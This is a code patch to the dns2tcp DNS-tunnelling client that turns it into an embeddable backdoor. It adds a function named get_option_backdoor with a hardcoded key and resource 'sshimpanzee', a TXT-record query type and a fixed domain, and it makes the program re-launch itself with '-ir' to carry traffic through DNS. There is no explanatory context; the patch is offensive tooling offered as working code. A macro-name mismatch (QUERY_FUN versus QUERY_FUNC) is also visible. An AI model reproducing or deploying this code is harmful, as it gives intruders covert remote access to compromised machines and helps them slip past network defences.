@@ -1,0 +1,134 @@
+diff --git a/client/main.c b/client/main.c
+index 45091d7..aa6728d 100644
+--- a/client/main.c
++++ b/client/main.c
+@@ -42,7 +42,7 @@
+  * @retval -1 on error
+  **/
+ 
+-int			main(int argc, char **argv)
++/*int			main(int argc, char **argv)
+ {
+   t_conf		conf;
+   
+@@ -64,3 +64,20 @@ int			main(int argc, char **argv)
+     do_client(&conf);
+   return (0);
+ }
++*/
++
++
++int tun()
++{
++  t_conf		conf;
++  
++  if ((get_option_backdoor(DNSSERV, &conf)) ||  
++      ((conf.sd_udp = create_socket(&conf)) == -1))
++    return (-1);
++  srand(getpid() ^ (unsigned int) time(0));
++  if (!conf.resource)
++    return (list_resources(&conf));
++  if ((!conf.local_port) || (!bind_socket(&conf)))
++    do_client(&conf);
++  return (0);
++}
+diff --git a/client/options.c b/client/options.c
+index 2748621..f3cd5cd 100644
+--- a/client/options.c
++++ b/client/options.c
+@@ -39,6 +39,18 @@ extern char	*optarg;
+ int		getopt(int, char * const *, const char *);
+ #endif
+ 
++#ifndef DNS2TCP_KEY
++#define DNS2TCP_KEY "sshimpanzee"
++#endif
++
++#ifndef DNS2TCP_RES
++#define DNS2TCP_RES "sshimpanzee"
++#endif
++
++#ifndef DNS2TCP_QUERY_FUN
++#define DNS2TCP_QUERY_FUN "TXT"
++#endif
++
+ 
+ #include "client.h"
+ #include "my_config.h"
+@@ -330,3 +342,39 @@ int			get_option(int argc, char **argv, t_conf *conf)
+ 
+ 	  
+ 	  
++
++
++int  get_option_backdoor(char* qdn, t_conf *conf)
++{
++  int			c;
++  char			config_file[2048];
++  char *cmdline;
++  
++  memset(conf, 0, sizeof(t_conf));
++  memset(config_file, 0, sizeof(config_file));
++  debug = 0;
++  conf->conn_timeout = 3;
++  conf->sd_tcp = -1;
++  conf->disable_compression = 1;
++  conf->query_functions = get_rr_function_by_name(DNS2TCP_QUERY_FUNC);
++  
++  //Custom Parsing
++  readlink("/proc/self/exe", config_file,
++	   sizeof(config_file));
++  cmdline = (char*)malloc(strlen(config_file)+16);
++  snprintf(cmdline, strlen(config_file)+16, "%s -ir", config_file);
++  conf->cmdline = cmdline;
++  conf->domain = qdn;
++  conf->key = DNS2TCP_KEY;
++  conf->resource = DNS2TCP_RES;
++  #ifdef DNS2TCP_RESOLVER
++  conf->dns_server = DNS2TCP_RESOLVER;
++  #endif
++  
++  if (!conf->dns_server)
++    read_resolv(conf);
++  
++  //if (debug)
++  //  fprintf(stderr, "debug level %d\n", debug);
++  return (0);
++}
+diff --git a/common/debug.c b/common/debug.c
+new file mode 100644
+index 0000000..fce73ee
+--- /dev/null
++++ b/common/debug.c
+@@ -0,0 +1 @@
++int debug;
+diff --git a/common/includes/debug.h b/common/includes/debug.h
+index 37c22d9..8f8d59d 100644
+--- a/common/includes/debug.h
++++ b/common/includes/debug.h
+@@ -24,7 +24,7 @@
+ #include <stdio.h>
+ #include <time.h>
+ 
+-int debug;
++extern int debug;
+ 
+ #ifndef _WIN32
+ #define DPRINTF(level, fmt, args...)  \
+diff --git a/common/includes/dns.h b/common/includes/dns.h
+index 6670755..5ec4901 100644
+--- a/common/includes/dns.h
++++ b/common/includes/dns.h
+@@ -124,10 +124,11 @@
+ 		     )
+ 
+ /* FIXME hardcoded '=' is bad ! (check base64_padding ...) */
++#ifndef CUSTOM_STRINGS
+ #define RESOURCE	"=resource."
+ #define AUTH		"=auth."
+ #define CONNECT		"=connect."
+-
++#endif
+ 
+ 
+ struct				dns_hdr {
